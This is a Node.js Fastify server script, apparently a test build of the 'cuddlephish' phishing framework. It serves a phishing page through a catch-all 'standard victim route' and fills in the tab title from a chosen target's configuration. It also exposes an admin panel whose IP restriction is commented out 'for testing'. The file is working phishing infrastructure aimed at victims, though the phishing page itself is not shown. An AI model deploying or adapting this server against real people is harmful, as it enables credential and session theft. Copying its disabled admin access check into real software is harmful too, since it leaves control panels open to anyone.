import fs from 'fs'
import path from 'path'
const __dirname = path.resolve()
import Fastify from 'fastify'
import fastify_io from 'fastify-socket.io'
import replace from 'stream-replace'

//import admin config
const config = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
//import custom target configs
const targets = JSON.parse(fs.readFileSync('./targets.json', 'utf8'));
const target = targets[process.argv[2]]

if (!target) {
  console.error('Target not found. Available targets:', Object.keys(targets))
  process.exit(1)
}

console.log('Target loaded:', target)

const fastify = Fastify({
  logger: false,
  bodyLimit: 19922944
})

//used to set up websockets
fastify.register(fastify_io, {maxHttpBufferSize: 1e11})

//admin route
fastify.route({
  method: ['GET'],
  url: '/admin',
  handler: async function (req, reply) {
    let client_ip = req.headers['x-real-ip']
    console.log('Admin request from IP:', client_ip)
    console.log('Config admin IPs:', config.admin_ips)
    
    // For testing, let's allow all IPs
    let stream = fs.createReadStream(__dirname + "/admin.html")
    reply.type('text/html').send(stream.pipe(replace(/SOCKET_KEY/, config.socket_key)))
  }
})

//standard victim route
fastify.route({
  method: ['GET'],
  url: '/*',
  handler: async function (req, reply) {
    let client_ip = req.headers['x-real-ip']
    console.log('Main request from IP:', client_ip, 'URL:', req.url)
    
    let stream = fs.createReadStream(__dirname + "/cuddlephish.html")
    reply.type('text/html').send(stream.pipe(replace(/PAGE_TITLE/, target.tab_title)).pipe(replace(/CLIENT_IP/, client_ip || 'localhost')).pipe(replace(/TARGET_ID/, 'test')))
  }
})

// Run the server!
const start = async () => {
  fastify.listen({ port: 58082, host: '0.0.0.0' }, (err) => {
    if (err) {
      fastify.log.error(err)
      process.exit(1)
    }
    console.log(`🚀 Test server listening on port 58082`)
    console.log(`📝 Admin panel: http://localhost:58082/admin`)
    console.log(`🎯 Target page: http://localhost:58082/`)
  })
}

start() 